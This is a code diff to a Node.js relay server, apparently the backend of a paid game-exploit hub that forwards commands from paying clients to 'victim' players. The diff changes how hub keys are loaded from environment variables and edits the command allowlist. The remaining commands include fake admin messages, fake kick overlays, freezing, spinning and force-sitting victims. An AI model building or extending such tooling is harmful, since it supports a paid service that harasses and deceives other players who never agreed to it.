@@ -21,32 +21,45 @@ const PORT            = parseInt(process.env.PORT || "8080", 10);
 const PRESENCE_TTL_MS = parseInt(process.env.PRESENCE_TTL_MS || "15000", 10);
 const MAX_QUEUE       = parseInt(process.env.MAX_QUEUE || "20", 10);
 
-// key -> hubId. Each partner hub has its own secret. Load HUB_KEYS (json) + legacy ADMIN_TOKEN.
+// key(secret) -> hubId. Three ways to configure keys (all can be combined):
+//   1. One variable per hub  -> name it after the hub, value MUST start with "key_"
+//      e.g.  Oxy = key_bnjk3458bks   ·   Citra = key_3452345bfg      <-- easiest in Railway
+//   2. HUB_KEYS               -> a single JSON var {"oxy":"key_...","citra":"key_..."}
+//   3. ADMIN_TOKEN            -> legacy single key, registered as hub "oxy"
+const RESERVED_ENV = new Set([
+  "PORT", "HUB_KEYS", "ADMIN_TOKEN", "PRESENCE_TTL_MS", "MAX_QUEUE", "NODE_ENV", "PATH", "PWD",
+]);
 function loadHubKeys() {
   const keys = new Map();
+  // (2) HUB_KEYS json
   if (process.env.HUB_KEYS) {
     try {
       const o = JSON.parse(process.env.HUB_KEYS);
       for (const [hub, tok] of Object.entries(o)) if (tok) keys.set(String(tok), String(hub));
     } catch { console.warn("[oxy-relay] HUB_KEYS is not valid JSON — ignoring it"); }
   }
+  // (3) legacy single ADMIN_TOKEN
   if (process.env.ADMIN_TOKEN) keys.set(process.env.ADMIN_TOKEN, "oxy");
+  // (1) one variable per hub: any env var whose VALUE starts with "key_"  (var name = hub id)
+  for (const [name, val] of Object.entries(process.env)) {
+    if (RESERVED_ENV.has(name) || name.startsWith("RAILWAY_") || name.startsWith("npm_")) continue;
+    if (typeof val === "string" && val.startsWith("key_") && !keys.has(val)) {
+      keys.set(val, name.toLowerCase());
+    }
+  }
   return keys;
 }
 const HUB_KEYS = loadHubKeys();
 
-// Commands a paid client is allowed to send. Keep this the source of truth.
+// Commands a paid client is allowed to send. No far/teleport movement (no fling/launch/bring).
 const ACTIONS = new Set([
-  "ping",      // harmless: victim shows a debug toast. Used for testing the pipe.
-  "notify",    // fake admin message toast
-  "fling",     // spin + pop the victim's character
-  "launch",    // straight-up velocity pop
-  "spin",      // continuous spin, no upward pop
-  "freeze",    // anchor victim for args.duration
-  "unfreeze",  // release freeze early
-  "bring",     // teleport victim to args.cf (sender's CFrame)
-  "sit",       // force-sit / trip
+  "ping",      // harmless: victim shows a small toast. Used for testing the pipe.
+  "notify",    // fake admin message toast / banner
   "fakekick",  // fake "you were kicked" overlay (does not actually kick)
+  "spin",      // rotate the victim in place for args.duration
+  "freeze",    // anchor the victim in place for args.duration
+  "unfreeze",  // release a freeze early
+  "sit",       // force-sit / trip
 ]);
 
 if (HUB_KEYS.size === 0) {
